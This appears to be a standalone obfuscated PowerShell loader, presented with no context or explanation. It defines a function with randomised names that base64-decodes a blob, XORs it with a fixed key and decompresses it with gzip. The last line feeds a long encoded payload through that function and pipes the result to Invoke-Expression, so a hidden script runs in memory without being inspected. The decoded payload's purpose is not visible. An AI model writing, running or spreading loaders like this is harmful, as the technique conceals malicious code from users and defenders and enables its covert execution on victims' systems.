$12fq45xcmb3aipk = [System.Text.Encoding]::ascii
function u5vdqiet3x8wry1c6hsfz7pbanm  {param($s46kj8v9qxrint2 )
  $ec4na8p5sbxgyzw = [System.Convert]::FromBase64String($s46kj8v9qxrint2)
  $p2b68ovherq130x= $12fq45xcmb3aipk.GetBytes("pxyd3ksolzq8")
    $ywqzokd430ac175 = $ec4na8p5sbxgyzw
    $n6xqrobtyw8572a = $(for ($2gcqa6fhuv45twi = 0; $2gcqa6fhuv45twi -lt $ywqzokd430ac175.length; ) {
        for ($qv4xn5p70flzkb3 = 0; $qv4xn5p70flzkb3 -lt $p2b68ovherq130x.length; $qv4xn5p70flzkb3++) {
            $ywqzokd430ac175[$2gcqa6fhuv45twi] -bxor $p2b68ovherq130x[$qv4xn5p70flzkb3]
            $2gcqa6fhuv45twi++
            if ($2gcqa6fhuv45twi -ge $ywqzokd430ac175.Length) {
                $qv4xn5p70flzkb3 = $p2b68ovherq130x.length
            }
        }
    })
	$jizmwasx1tocl84 = New-Object System.IO.MemoryStream( , $n6xqrobtyw8572a )

	    $pr30h8b4fjc9oty = New-Object System.IO.MemoryStream
        $mcyl5hsn192vtad = New-Object System.IO.Compression.GzipStream $jizmwasx1tocl84, ([IO.Compression.CompressionMode]::Decompress)
	    $mcyl5hsn192vtad.CopyTo( $pr30h8b4fjc9oty )
        $mcyl5hsn192vtad.Close()
		$jizmwasx1tocl84.Close()
		[byte[]] $m1ap3jsenwoydl6 = $pr30h8b4fjc9oty.ToArray()
 $imkbdlg3hytrsf4=$m1ap3jsenwoydl6
    return $imkbdlg3hytrsf4
}
[byte[]]$ruy1c2latqjgb6k=u5vdqiet3x8wry1c6hsfz7pbanm $8zqs2a0t3ljuy5v
[System.Text.Encoding]::ascii.GetString((u5vdqiet3x8wry1c6hsfz7pbanm "b/NxZDNrc29oevxtHQvaUiOVLwmUdWu1S7mMpdPcl/UgRKkG4sD0t48TCbiWSEYKeCh1ZjgKn8uSlSxm7ECBWjcNc8I6tU/DnDLR7jnc6B03yPmbtBmX+JYl+b/n0FGAEloxzAbDroyICa13lhMWl68WMeL8ME5K6t0uRxI1mRRo59Lhs17oUAfNB0Jh8aqps8COHEkhYfRdmePykT6rIPBqADOj5QKy60H8eLbSO8Qc6z+veMud14CaJNc161h6pdAFQNfoZw+9DA+b+NfR9NMaUs0cMmNCrNMljtumWa6B9BJb41Xmx7a4mPWoFO7MT+aIZUduuyuGg9U/MHW06Tcjo56AX0hOjQysj/jnsuMV/H+UClh2vCtqlvGYtSErnTEvxh08zlqDvVaea0RWgu5hxgFBKtpSztqs2WnGBJdTqRRul4PxkMpx+4OsHQTot2IZCU7AhhHSEuc7PUQDzPoe4qptmVPw0VDMgOzEqtFh0b5VocXWgo4BDdtHDTqSDqAGbhk4sjAtLxSTzqfWB60jYWvGiCN2nKdc6Jlfd47iAd8ZjVEbeFrxyoH2/HD3r+PR4QcP3RSBBq0nnL6+octvtZBNWtvnczptRk5/1jPODHa5jS+NVoAWUXF3Rcd1JNCpFFBJDhviYeWXPjFlX3f5nAoQ1lvZshkpm/GC5K2zdGnd4uvp+iwODfuk2aepMa+NLGZvfsx5r2gQ+HLBzQbSjpH3a1bVEhG5QPdCwxl9IKlAFkm3wwBqeJpwa0R8yhGi+bOjlvxbRS9snRg1x3kU05FsQ7OZUPl1tlyYbx9yelLFH2rdkDNomtQW2A1XlyJu7ugl5nEQabbp1+PhRq5PemKLu3fZ2lu/G/J6Z6nuXHgsocAZZX7hahPKUMLinMdVEvJqaag2MTBUSfXHVHIGaubhLKPE9FJcFCBro9EY3zJZvB3X6JaFriHCT3enx0KZ1lDDdGKQjEL4D/S/GOFdvqbxj5RKqMPBfL+mmKPSxoPGiU7D19+w1KoImujvpoXkXY0kzTIVo+7u4w0aaf6iU9wXTbLJVQZCq2ZO/V1GaO4+cZpNt/QrmDkoS+3y6yV8VP0Ss2SFTbE0ERNkVzIvHhVp/wwVfrbWORSHFv0z0EPe2xA4kZxK6DtT7C3kJCoo5Clbfc8sklrbrbZ2hFPonTqo69F8Mnl+pngo89IKqj4Hey0X3FEYwR0r5OSej3kGIbHYLGhseg=="))|iex;